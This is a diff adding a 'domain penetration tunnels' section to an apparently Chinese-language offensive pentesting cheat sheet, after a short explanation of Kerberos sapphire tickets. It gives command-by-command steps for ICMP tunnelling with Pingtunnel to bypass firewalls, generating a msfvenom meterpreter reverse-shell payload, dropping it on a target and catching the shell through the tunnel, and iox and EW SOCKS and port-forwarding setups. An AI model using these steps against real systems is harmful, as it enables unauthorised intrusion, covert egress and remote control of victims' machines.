@@ -163,3 +163,86 @@
 + 简介
   + 蓝宝石票据与钻石票据类似，票据不是伪造的，而是通过请求后获得的合法票据。他们的区别在于 `PAC`的修改方式。钻石票据是修改了合法 `PAC`以添加特权组。在蓝宝石票据中，高权限用户 `PAC`是通过
     `S4U2Self+U2U`获得的，然后该 `PAC`会替换原来的 `PAC`，由于该票据是完全合法元素组合起来的，所以是最难检测的票据。
+
+## 域渗透隧道
+
++ ICMP
+  + 简介
+    + 报文协议，用于传递控制消息(错误报告，操作请求，网络诊断等)
+    + ICMP可包装TCP/UDP数据到PING包内，FW不会屏蔽PING包，实现不受限访问
+  + 工具
+    + Pingtunnel [https://github.com/esrrhs/pingtunnel](https://github.com/esrrhs/pingtunnel)
+      + VPS
+        + ./pingtunnel -type server -key [只能为数字]
+      + Client
+        + pingtunnel.exe -type client -l :2222 -s [vps_ip] -t [vps_ip:3333] -tcp  1 -noprint 1 -nolog 1 -key 0000
+        + 本地的2222端口转发到vps的ICMP端口 使用tcp协议
+      + 上线MSF
+        + ```
+          msf利用icmp隧道反向出网获取shell
+          kali执行pingtunnel运行服务端
+          ./pingtunnel -type server -noprint 1 -nolog 1 &
+          kali执行msf监听
+          use exploit/multi/handler
+          set payload linux/x64/meterpreter_reverse_tcp
+          set lhost 192.168.1.5
+          set lport 7777
+          run
+
+          kali 生成linux反弹木马,上传到目标机器centos的tmp下
+          msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f elf > virscan.elf
+
+          上传pingtunnel 到centos并执行
+          # ./pingtunnel -type client -l 127.0.0.1:6666 -s 192.168.1.5 -t 192.168.1.5:7777 -tcp 1 -noprint 1 -nolog 1 &
+
+
+          centos执行木马
+          ./virscan.elf
+
+          kali接受到反弹shell
+          meterpreter > shell
+          SHELL=/bin/bash script -q /dev/null
+          ```
+    + IOX [https://github.com/EddieIvan01/iox]()
+      + 联动使用
+        + VPS
+          + 使用Pingtunnel搭建好vps、client后
+          + ./iox proxy -l 3333 -l 4444
+          + 将本地的3333端口转发到4444端口开启socks5隧道 注意顺序
+        + Client
+          + iox.exe proxy -r 0.0.0.0:2222
+          + 客户端将本地的2222端口转发出网
+        + 服务端收到客户端的socks5请求则成功
+      + 单独使用
+        + 穿透
+          + VPS
+            + ./iox fwd -l *2222 -l 3333 -k 123456
+            + 将所有ip请求2222端口的流量转发到3333端口 并且使用key加密
+          + Client
+            + ./iox fwd -r 127.0.0.1:22 -r *vps:2222 -k 123456
+            + 将本地22端口转发到服务端的2222端口
+            + 此时的服务端访问本地的3333端口即可访问客户端的22端口
+        + socks5
+          + VPS
+            + /etc/proxychains.conf写入socks5 0.0.0.0:1080
+            + 或者
+            + sockscap64中添加
+            + ./iox proxy -l 2222 -l 1080
+            + 建立socks5隧道 将2222端口转发到1080
+          + Client
+            + ./iox proxy -r vps:2222
+            + 连接服务端的2222端口建立socks5
+      + EW
+        + 联动使用 https://blog.csdn.net/huayimy/article/details/135347548
+          + 不知道为什么iox 和 pingtunnel为什么不能联动启socks5 随即换ew
+          + VPS
+            + ./ew -s rcsocks -e 3333 -l 4444
+            + 建立socks5隧道 将3333端口转发到4444
+          + Client
+            + ./ew -s rssocks -d 127.0.0.1 -e 2222
+            + 将客户端本地的请求通到我们客户端开启的pingtunnel的2222端口下
+      + SPP
+        + https://forum.butian.net/index.php/share/400
+        + https://github.com/esrrhs/spp
+        + VPS
+          + todo
